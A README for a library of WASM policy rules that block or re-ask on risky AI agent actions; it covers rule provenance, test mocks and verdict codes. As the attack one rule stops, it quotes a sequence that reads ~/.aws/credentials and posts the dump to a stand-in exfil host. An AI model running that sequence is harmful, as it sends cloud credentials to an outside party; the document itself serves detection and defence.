# Starter rule library

Eight drop-in WASM rules. Each directory is self-contained: `rule.ts`, a
`block.json` mock the rule must refuse, and an `allow.json` (plus sometimes
`allow-*.json`) mock it must permit. `dropInRules.test.ts` compiles every
directory standalone — the exact `intutic policy compile` invocation each
rule's own docstring gives — and asserts both mocks, so a rule that only
works pasted into the template's `runRules()` would fail here.

## Where each rule actually comes from

Two different, and both honest, answers. Stated here because the difference
matters to anyone deciding whether to trust a rule's block case as evidence
against a real attack, or as an example of reading one field correctly —
and because a prior version of this library implied all of it was the
former.

**Corpus-backed — traced to a real attack class in
[`packages/proxy/tests/corpus_support/mod.rs`](../../proxy/tests/corpus_support/mod.rs),
whose mutation site is the ground truth (no LLM judge, nothing to disagree
with):**

| Rule | Corpus mutator | What it reproduces |
|---|---|---|
| `secret-read-to-egress` | `exfil_succession` | `cat ~/.aws/credentials` then `curl -d @dump.txt https://exfil…`, through the real classifier: `action:secret_read` before `action:http_post`. The proxy already blocks this natively (`ForbiddenSuccessionDetector`); this rule is a worked WASM example of the same attack class, not a gap the native detector leaves open. |
| `deploy-without-tests` | `deploy_without_tests` | `git push origin main` with no prior test run: `action:deploy` with no `action:run_tests` before it. Natively blocked too (`MissingPredecessorDetector`), same reasoning. |

**Field-coverage — one rule per `RequestContext` field with no other
consumer, so the rule doubles as the field's coverage test** (this is the
actual criterion the other six were picked by; see `docs/TECH_DEBT.md`
TD-306):

| Rule | Field it exercises | The inversion its allow mock catches |
|---|---|---|
| `graph-budget-guard` | `graph_spend_usd` / `graph_budget_usd` | `-1` means unknown, not zero |
| `harness-allowlist` | `allowed_harnesses` | an empty list means unrestricted, not "permit nothing" |
| `orphaned-node` | `parent_alive` | `-1` (unknown) is not the same as dead |
| `tool-contract-pinned` | `tool_contract_changed` | — |
| `risk-tier-ceiling` | `risk_tier` | the tier describes the SOP, not the request — reask, not block |
| `injection-then-egress` | `injection_findings` | a pattern match, not a fact — reask, not block |

An earlier version of this library was framed as "six to eight rules drawn
from attack classes already in `corpus_support`" without drawing this
distinction, which overstated the provenance of four of the original six.
Nothing about those four is wrong — `graph-budget-guard` blocking an
over-budget graph is a real, useful rule — only the claim that it came from
the same place `secret-read-to-egress` did.

## Verdict codes

`0` allow · `1` block · `3` reask. `2` is deprecated: the proxy maps it to a
block, so a rule returning it believing it redacts gets a block instead.
`intutic policy install` refuses a rule returning anything else.

Block is for facts the agent cannot correct (a budget that is already over,
a contract that already changed). Reask is for findings that produce false
positives by construction — a pattern match, or a tier that describes the
policy rather than this specific request.
